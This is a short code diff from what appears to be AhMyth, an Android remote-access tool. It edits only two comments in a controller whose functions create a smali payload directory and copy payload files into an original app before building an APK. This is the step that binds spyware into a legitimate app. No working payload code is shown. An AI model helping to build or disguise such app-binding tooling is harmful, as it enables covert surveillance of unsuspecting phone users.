@@ -373,7 +373,7 @@ app.controller("AppCtrl", ($scope) => {
             });
     };
 
-    // function to create the smali payload directory for storing ahmyth payload directories and files when binding
+    // function to create the smali payload directory for storing payload directories and files when binding
     $appCtrl.createPayloadDirectory = (files) => {
         var ignoreDirs = ['original',
             'res',
@@ -403,7 +403,7 @@ app.controller("AppCtrl", ($scope) => {
         }
     };
 
-    // function to copy ahmyth source files to the orginal app
+    // function to copy payload source files to the original app
     // and if success go to generate the apk
     $appCtrl.copyAhmythFilesAndGenerateApk = (apkFolder) => {
 
